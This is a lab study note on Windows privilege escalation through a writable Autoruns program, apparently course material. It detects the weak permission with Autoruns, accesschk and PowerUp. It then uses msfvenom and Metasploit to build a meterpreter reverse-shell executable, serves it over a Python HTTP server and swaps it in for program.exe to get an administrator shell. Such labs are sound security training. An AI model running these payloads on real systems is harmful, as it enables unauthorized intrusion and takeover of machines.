#Windows #PrivEsc #Registry #Autoruns #Accesschk #PowerUp #Bitsadmin #msfconsole #MSFvenom #meterpreter #metasploit #SimpleHTTPServer
# **Autoruns**

## **Detection**

Windows VM

1. Open command prompt and type: `C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe`  
2. In Autoruns, click on the ‘Logon’ tab.  
3. From the listed results, notice that the “My Program” entry is pointing to “`C:\Program Files\Autorun Program\program.exe`”.  
4. In command prompt type: `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"`  
5. From the output, notice that the “Everyone” user group has “`FILE_ALL_ACCESS`” permission on the “program.exe” file.

- Can run `PowerUp.ps1` and see this is vulnerable as well - Must open `cmd` at location of `PowerUp.ps1`
```
PS > powershell -ep bypass

PS > . .\PowerUp.ps1

PS > Invoke-AllChecks
```

**Exploitation**

Kali VM

1. Open command prompt and type: **`msfconsole`**  
2. In Metasploit (msf > prompt) type: **`use multi/handler`**  
3. In Metasploit (msf > prompt) type: **`set payload windows/meterpreter/reverse_tcp`**  
4. In Metasploit (msf > prompt) type: **`set lhost [Kali VM IP Address]`**  
5. In Metasploit (msf > prompt) type: **`run`**  
6. Open an additional command prompt and type: `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe`  
7. Copy the generated file, program.exe, to the Windows VM (many ways to do [[🟩HTB Academy/07_File Transfers/File Transfers|File Transfers]], but should use a simple python server and navigate to the `lhost` IP in Internet Explorer).
```
┌──(root㉿kali)-[~/Downloads]
└─# python -m SimpleHTTPServer 80 
Serving HTTP on 0.0.0.0 port 80 ...
```
- Run program and catch `meterpreter` reverse shell
	- POC achieved, so now exit this shell and follow next steps for `Autorun` privilege escalation

Windows VM

1. Place program.exe in ‘`C:\Program Files\Autorun Program`’.  
2. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.

Kali VM

1. Wait for a new session to open in Metasploit.  
2. In Metasploit (msf > prompt) type: `sessions -i [Session ID]`  
3. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: `getuid`
